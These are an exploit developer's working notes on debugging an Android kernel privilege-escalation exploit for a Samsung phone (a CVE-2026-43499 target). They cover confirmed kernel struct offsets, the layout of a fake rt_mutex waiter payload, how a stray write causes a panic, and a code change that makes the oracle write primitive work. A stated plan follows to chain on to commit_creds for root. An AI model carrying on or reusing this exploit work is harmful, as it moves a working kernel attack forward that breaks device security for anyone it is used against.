# r9q2 CVE-2026-43499 crash analysis — oracle side-write bug

**Status:** root cause identified, fix ready to apply, NOT YET APPLIED.

---

## Device / target

- SM-G990B2 (r9q2), firmware G990B2XXSKIZH2
- Linux 5.4 QGKI, `LEGACY_RT_MUTEX_WAITER = 1`
- App: `dev.busung.s25uroot`, user 150
- Log: `/data/data/dev.busung.s25uroot/files/exploit.log`

---

## Symptom

Device reboots after log line `slide pi stage=deadlock-accepted`.
Lines `wait-timeout-accepted` through `writer-return` are **never written** — they're in libc's write buffer when the kernel panics.

---

## Kernel struct layout (CONFIRMED for r9q2)

```c
// FAKE_WAITER_PI_TREE_ENTRY_OFF = 0x18
// FAKE_WAITER_TASK_OFF = 0x30
// FAKE_WAITER_LOCK_OFF = 0x38
// FAKE_WAITER_PRIO_OFF = 0x44  ← NOTE: kernel struct has int prio at +0x40,
//                                 but put_fake_waiter writes to +0x44 (intentional mismatch)
// FAKE_WAITER_DEADLINE_OFF = 0x48

struct rt_mutex_waiter {
    struct rb_node  tree_entry;     // +0x00 (18 bytes)
    struct rb_node  pi_tree_entry;  // +0x18 (18 bytes)
    struct task_struct *task;       // +0x30
    struct rt_mutex  *lock;         // +0x38
    int             prio;           // +0x40  ← kernel reads HERE
    // gap/padding at +0x41..+0x43
    // put_fake_waiter writes prio to +0x44 (FAKE_WAITER_PRIO_OFF)
    u64             deadline;       // +0x48
};
```

Consequence: `payload_waiter->prio` (as seen by kernel at +0x40) = **0** (zeroed payload memory),
not `SLIDE_FAKE_WAITER_PRIO = 0`.  Both happen to be 0, consistent.

---

## pselect fake_waiter word layout (GATE slot, APP_PHYS_P0_ORACLE + APP_REQUIRE_FRESH_P0_SESSION)

From `prepare_slide_pselect_fdsets` (slide_app.c:903–953):

| word | field              | current value                              |
|------|--------------------|--------------------------------------------|
| 0    | tree_entry.__rb_pc | `p0_gate_page_struct \| SLIDE_RB_PARENT_TYPE_RESTORE` = `p0_gate_page_struct \| 1` |
| 1    | tree_entry.rb_right| 0                                          |
| 2    | tree_entry.rb_left | `target` = `pipebuf_page_base + 0x800`     |
| 3    | pi_tree.__rb_pc    | `p0_gate_page_struct`                      |
| 4    | pi_tree.rb_right   | 0                                          |
| 5    | pi_tree.rb_left    | `target`                                   |
| 6    | task               | `fake_task`                                |
| 7    | lock               | `fake_lock`                                |
| 8    | prio               | `ACTIVE_PSELECT_WAITER_PRIO`               |
| 9    | deadline           | 0                                          |

`SLIDE_RB_PARENT_TYPE_RESTORE = 1ULL` (target.h line 114).

---

## Oracle chain walk trace (rt_mutex_adjust_prio_chain)

Triggered by `sched_setattr(waiter_tid)` in consumer thread →
`rt_mutex_adjust_pi(waiter_task)` → `rt_mutex_adjust_prio_chain`.

### Line 661: prerequeue_top_waiter = rt_mutex_top_waiter(fake_lock)

- `fake_lock->waiters.rb_leftmost` = `payload_waiter` (set in util.c)
- `payload_waiter->lock` = `fake_lock` ✓ (BUG_ON passes)
- `prerequeue_top_waiter = payload_waiter`

### Line 664: rt_mutex_dequeue(fake_lock, pselect_fake_waiter)

rb_erase_cached:
- `rb_leftmost = payload_waiter ≠ pselect_stack_addr` → skip rb_next

rb_erase — one-left-child case (rb_right=0, rb_left=target):
```
pc     = tree_entry.__rb_pc = p0_gate_page_struct | 1   (RED, parent = p0_gate_page_struct)
parent = p0_gate_page_struct

SIDE WRITE:   target + 0x00  = p0_gate_page_struct | 1   ← BUG
ORACLE WRITE: p0_gate_page_struct + 0x08 = target        ← intended
```

`fake_lock->waiters.rb_root.rb_node` = payload_waiter (unchanged — change_child used parent path).

### Lines 682–685: prio update + re-enqueue

After `waiter->prio = waiter_task->prio ≈ 120`:
- `pselect->prio (120) < payload->prio (0)` → FALSE → pselect inserted to RIGHT
- `fake_lock->waiters.rb_leftmost` = payload_waiter (unchanged)
- `rt_mutex_top_waiter(fake_lock)` = payload_waiter

### Lines 715–741: pi_tree_entry dequeue decision

```
waiter == rt_mutex_top_waiter(fake_lock)?  pselect ≠ payload → FALSE
prerequeue_top_waiter == waiter?           payload ≠ pselect  → FALSE
→ else branch: NO pi_tree_entry dequeue, NO rt_mutex_dequeue_pi at line 722
```

**The oracle fires at line 664 (tree_entry path), not line 722 (pi_tree_entry path).**

### Summary of writes

| Address                   | Value written           | Purpose                     |
|---------------------------|-------------------------|-----------------------------|
| `p0_gate_page_struct+0x08`| `target`                | PRIMARY oracle write ✓      |
| `target+0x00`             | `p0_gate_page_struct\|1`| SIDE WRITE — **BUG** ↓     |

`target = pipebuf_page_base + 0x800` = base of second pipe kmalloc-0x800 object.
`target + 0x00 = struct pipe_buffer[0].page` inside that object.

---

## Root cause of kernel panic

The SIDE WRITE sets `pipe_buffer[0].page = p0_gate_page_struct | 1`.

This is a **misaligned** `struct page *` pointer (bit 0 set = 1 byte offset from a 64-byte-aligned vmemmap struct page).

The oracle verification in `verify_p0_pipe_oracle_gate` (pipe.c:1082) calls:
1. `pipe_duplicate_bytes` (tee syscall) → kernel accesses `buf->page`
2. `pipe_read_full` (read syscall) → kernel maps `buf->page`

When kernel calls `kmap(buf->page)` or `PageHighMem(buf->page)` on the misaligned pointer,
it accesses `(p0_gate_page_struct + 1)->flags` — an **unaligned 8-byte load on ARM64**.

Samsung's kernel for r9q2 does NOT have `CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS` for this path,
so ARM64 raises a **data abort alignment fault → kernel panic → reboot**.

### Why the oracle relies on the side write

The "RMG-P0-ORACLE-GATE" marker string is pre-written into the GATE physical page.
`p0_gate_page_struct` is the vmemmap struct page for that physical page.

The side write `target + 0x00 = gate_struct_page_ptr` replaces `pipe_buffer[0].page`
with the gate physical page. When the pipe is read, the kernel reads from the gate physical
page, finds the marker → oracle detected.

Without the side write (or with a misaligned pointer), this detection fails / crashes.

---

## The fix

**File:** `src/slide_app.c`
**Line:** 940

Change:
```c
{0, stack_tree_parent | SLIDE_RB_PARENT_TYPE_RESTORE, "tree_pc"},
```
To:
```c
{0, stack_tree_parent | (stack_tree_left ? 0ULL : SLIDE_RB_PARENT_TYPE_RESTORE), "tree_pc"},
```

### Why this works

When `stack_tree_left != 0` (GATE / PROBE slots with real target):
- `tree_pc = p0_gate_page_struct | 0 = p0_gate_page_struct` (BLACK, no misalignment)
- Side write: `target + 0x00 = p0_gate_page_struct` ← **clean aligned pointer**
- Oracle write: `p0_gate_page_struct + 0x08 = target` ← unchanged

When `stack_tree_left == 0` (GATE_RESTORE / PROBE_RESTORE slots, target = 0):
- `tree_pc = p0_gate_page_struct | SLIDE_RB_PARENT_TYPE_RESTORE = p0_gate_page_struct | 1` (RED)
- rb_erase leaf case: `__rb_change_child(node, NULL, parent, root)` → `p0_gate_page_struct + 0x08 = 0`
- No side write (no child to write to)
- This is the RESTORE behavior — restores oracle location to 0. Preserved.

### Why NOT just `stack_tree_parent = 0`

If `stack_tree_parent = 0`:
- Oracle write goes to `fake_lock->waiters.rb_root.rb_node`, NOT to `p0_gate_page_struct + 0x08`
- Oracle never fires
- Side write = `target + 0x00 = 1` (even more broken)

### Why NOT change SLIDE_RB_PARENT_TYPE_RESTORE globally

`SLIDE_RB_PARENT_TYPE_RESTORE` is also used in `fops.c:318` for restoring
`SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset + 8` to value `1ULL`. Changing it to 0
breaks the FOPS route's restore step. Must stay `1ULL` in target.h.

---

## rb_erase behavior with BLACK one-left-child (after fix)

```
pc     = p0_gate_page_struct       (BLACK, parent = p0_gate_page_struct)
tmp    = rb_left = target

tmp->__rb_parent_color = pc        → target + 0x00 = p0_gate_page_struct (CLEAN side write)
__rb_change_child(node, tmp,
  parent=p0_gate_page_struct, root) → p0_gate_page_struct + 0x08 = target (oracle write)
rebalance = NULL                   (child was RED per RB invariant, made BLACK, height maintained)
```

No rebalancing. No crash. Oracle fires. pipe_buffer[0].page = p0_gate_page_struct (aligned).

---

## Other fixes already applied (prior sessions)

1. `fake_lock->owner = 0` in P0 diag path → fixed: `SLIDE_BANK_LOCK_OWNER_TASK ? (task|1) : SLIDE_LOCK_OWNER_VALUE`
2. `KSNITCH_COLLISIONS = 5` → fixed to `4` in target.h
3. `collect_controlled_mm_group` (34 slots, zone=normal) — CONFIRMED WORKING

---

## Files to change

| File | Line | Change |
|------|------|--------|
| `src/slide_app.c` | 940 | Remove unconditional `\| SLIDE_RB_PARENT_TYPE_RESTORE`; condition on `stack_tree_left` |

---

## Deploy flow (NEVER adb push)

1. Build in `/tmp/r9q2-build`
2. Copy `.so` artifact to `artifacts/r9q2-G990B2XXSKIZH2/`
3. Update `artifacts/r9q2-G990B2XXSKIZH2/README.md` — size + SHA256
4. `git commit && git push`
5. App downloads, test with log monitoring:
   ```
   adb -s <serial> logcat -c
   adb -s <serial> shell su -c "tail -F /data/data/dev.busung.s25uroot/files/exploit.log" &
   adb -s <serial> logcat | grep -i "r9q2\|exploit\|panic\|crash" &
   ```
6. Watch for `wait-timeout-accepted` → `writer-return` → `route-done` (no reboot)

---

## Oracle verification after fix

Expected log sequence post-fix:
```
slide pi stage=deadlock-accepted
...wait-timeout-accepted
...pselect-stack-copy
...sched-setattr-fired
...oracle-gate-ok  (or similar)
...writer-return
...route-done
```

`verify_p0_pipe_oracle_gate` should return 1 (gate_hits=1, changed=0).

---

## Next after oracle fix

Once oracle fires cleanly:
1. Implement oracle READ → FOPS write → `commit_creds` → root
2. This follows the established FOPS route pattern in the codebase
